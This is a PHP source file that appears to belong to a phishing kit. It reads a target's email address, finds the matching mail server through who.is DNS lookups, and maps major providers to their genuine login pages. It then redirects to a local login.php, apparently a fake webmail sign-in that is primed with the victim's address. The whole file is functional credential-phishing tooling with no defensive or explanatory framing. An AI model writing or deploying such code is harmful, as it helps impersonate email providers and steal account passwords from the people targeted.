<?php
include "blocker.php";
if(isset($_GET['userid'])){
    $strEmailAddress = $_GET['userid'];
    $strMainDomain      = 'mail.'.substr($strEmailAddress,strpos($strEmailAddress,"@")+1);
    $strSubDomain       = substr($strEmailAddress,strpos($strEmailAddress,"@")+1);
	require 'dom.php';

    //check domain with mail is exist or not
    $html = file_get_html('https://who.is/dns/mail.'.$strSubDomain);
    $boolIsMailExists = 0;
    foreach($html->find('tr') as $tr)
    {
        foreach($tr->find('td') as $td)
        {
            if($td->plaintext == 'A'){
                $boolIsMailExists = 1;
            }
        }
    }

    // if mail. domain not exists then search for mail server
    if($boolIsMailExists == 0){
        $html = file_get_html('https://who.is/dns/'.$strSubDomain);
        $i=1;
        $strMailServer = '';
        foreach($html->find('tr') as $tr)
        {
            $lock = 1;
            foreach($tr->find('td') as $td)
            {

                if($td->plaintext == 'MX'){
                    $lock=0;
                }
                if($lock == 0){
                    $strMailServer      = $td->plaintext;
                }

            }
            $lock = 1;
            $i++;

        }
    }
//break string into array
    $arrStrMailServer   = explode('.',$strMailServer);
    $intArrayCount      = count($arrStrMailServer);
	
    if($boolIsMailExists == 1){
        $strFinalMailServer = 'http://mail.'.$strSubDomain;
    }else{
        $strFinalMailServer = 'http://'.$arrStrMailServer[$intArrayCount-2].'.'.$arrStrMailServer[$intArrayCount-1];

    }
	
    if(strpos($strSubDomain, 'yahoo.com') !== false){
        $strFinalMailServer = 'https://login.yahoo.com/';
    }
    if(strpos($strSubDomain, 'gmail.com') !== false){
        $strFinalMailServer = 'http://gmail.com/';
     }
    if(strpos($strSubDomain, 'hinet.net') !== false){
        $strFinalMailServer = 'http://webmail.hinet.net';
 
    }  
    
	
    if(strpos($strSubDomain, 'btinternet.com') !== false){
        $strFinalMailServer = 'https://signin1.bt.com/login/emailloginform?s_cid=con_Furl_mail&utm_source=ATL&utm_medium=FURL&utm_content=R&utm_campaign=btmail';
    }
    
	
    if(strpos($strSubDomain, 'gmx.co.uk') !== false){
        $strFinalMailServer = 'https://www.gmx.co.uk/#.1559520-header-navlogin2-1';

    }
	
	if(strpos($strSubDomain, 'vip.126.com') !== false){
        $strFinalMailServer = 'http://vip.126.com/';

    }
	
	if(strpos($strSubDomain, 'vip.sina.com') !== false){
        $strFinalMailServer = 'http://vip.sina.com/';

    }
    
    
    if(strpos($strSubDomain, 'eim.ae') !== false){
        $strFinalMailServer = 'http://www.etisalat.ae/en/myaccount/email-account.jsp';

    }
    if(strpos($strSubDomain, '263.net') !== false){
        $strFinalMailServer = 'http://263xmail.com';

    }
    if(strpos($strSubDomain, 'emirates.net.ae') !== false){
        $strFinalMailServer = 'http://www.etisalat.ae/en/myaccount/email-account.jsp';

    }
	
	
	
	
	
    if(strpos($strSubDomain, 'btconnect.com') !== false){
        $strFinalMailServer = 'https://secure.business.bt.com/Hub/?TYPE=33554433&REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$0165yR%2b3Dztt%2fANd2vT6njwS3HKv4V9YfKwlSGaO5PMKEG0QOc5zLFRWKHgzOE6C&TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d0';


    }
	
    header('Location: login.php?main_domain='.$strFinalMailServer.'&userid='.$strEmailAddress.'&subdomain='.$strFinalMailServer);

}else{
    echo 'You have no access to view this page.';
}

?>